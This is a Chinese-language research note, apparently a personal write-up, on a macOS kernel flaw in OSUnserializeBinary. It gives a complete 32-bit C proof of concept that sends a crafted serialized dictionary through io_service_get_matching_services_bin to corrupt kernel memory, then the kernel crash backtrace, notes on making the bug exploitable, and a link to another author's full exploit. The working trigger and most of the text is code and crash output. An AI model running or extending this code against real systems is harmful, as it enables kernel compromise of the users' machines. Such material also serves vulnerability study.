程序必须通过32位编译才可以运行，64位的话会出现找不到函数
poc如下

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <stdio.h>

int main()
{
    uint32_t data[] = {
        0x000000d3,                             /*  magic               */
        0x81000010,                             /*  0: OSDictionary     */
        0x08000002, 0x00000061,                 /*  1: key "a"          */
        0x04000020, 0x00000000, 0x00000000,     /*  2: 1[2: OSNumber]   */
        0x08000002, 0x00000062,                 /*  3: key "b"          */
        0x04000020, 0x00000000, 0x00000000,     /*  4: 2[4: OSNumber]   */
        0x0c000001,                             /*  5: key "a"          */
        0x0b000001,                             /*  6: true; heap freelist: 1[2:]   */
        0x0c000003,                             /*  7: key "b"                      */
        0x0b000001,                             /*  8: true; heap freelist: 2[4:] 1[2:]     */
        0x0c000001,                             /*  9: key "a"          */
        0x0a000028,                             /*  10: 2[10,4: OSData] => 1[2: contents]   */
        0x00000000, 0x00000000,                 /*  vtable ptr          */
        0x00000000, 0x00000000, 0x00000000, 0x00000000,
        0x00000000, 0x00000000, 0x00000000, 0x00000000,
        0x0c000001,                             /*  11: key "b"         */
        0x8c000002,                             /*  12: 1[2: contents]->retain()    */
    };
    mach_port_t master_port, iterator;
    kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &master_port);
    if(kr != KERN_SUCCESS){
        return 1;
    }

    kr = io_service_get_matching_services_bin(master_port, (char *)data, sizeof(data), &iterator);
}


执行后程序崩溃

 thread #22, name = '0xffffff802a4b1c88', queue = '0x0', stop reason = EXC_BAD_ACCESS (code=1, address=0x20)
  * frame #0: 0xffffff80190375d5 kernel.development`OSUnserializeBinary(buffer=<unavailable>, bufferSize=120, errorString=<unavailable>) at OSSerializeBinary.cpp:341 [opt]
    frame #1: 0xffffff80190b8323 kernel.development`::is_io_service_get_matching_services_bin(mach_port_t, char *, mach_msg_type_number_t, io_object_t *) [inlined] internal_io_service_get_matching_services(master_port=<unavailable>) at IOUserClient.cpp:1795 [opt]
    frame #2: 0xffffff80190b8306 kernel.development`::is_io_service_get_matching_services_bin(master_port=<unavailable>, matching=<unavailable>, matchingCnt=<unavailable>, existing=0xffffff801d8f3e08) at IOUserClient.cpp:1850 [opt]
    frame #3: 0xffffff8018b65315 kernel.development`_Xio_service_get_matching_services_bin(InHeadP=<unavailable>, OutHeadP=0xffffff8024125388) at device_server.c:10589 [opt]
    frame #4: 0xffffff8018a92963 kernel.development`ipc_kobject_server(request=0xffffff802bd5a200) at ipc_kobject.c:339 [opt]
    frame #5: 0xffffff8018a6e6f3 kernel.development`ipc_kmsg_send(kmsg=<unavailable>, option=<unavailable>, send_timeout=0) at ipc_kmsg.c:1440 [opt]
    frame #6: 0xffffff8018a85035 kernel.development`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:470 [opt]
    frame #7: 0xffffff8018b89a4e kernel.development`mach_call_munger(state=0xffffff80231eec40) at bsd_i386.c:472 [opt]
    frame #8: 0xffffff8018bbf1e8 kernel.development`hndl_mach_scall + 216


调用栈如下


打开设备申请新的设备
另外接口文件在device/device.defs里面
Iouserclinet里面调用了序列化与反序列化的函数
Osdata在64位和number结构一样大，所以用的他，我要试试能不能换成osstring



设备名字不知道为什么不知道明天调试下应该能看到

https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS/blob/master/exp.m再加个别人的poc把，自己做不会了还能看看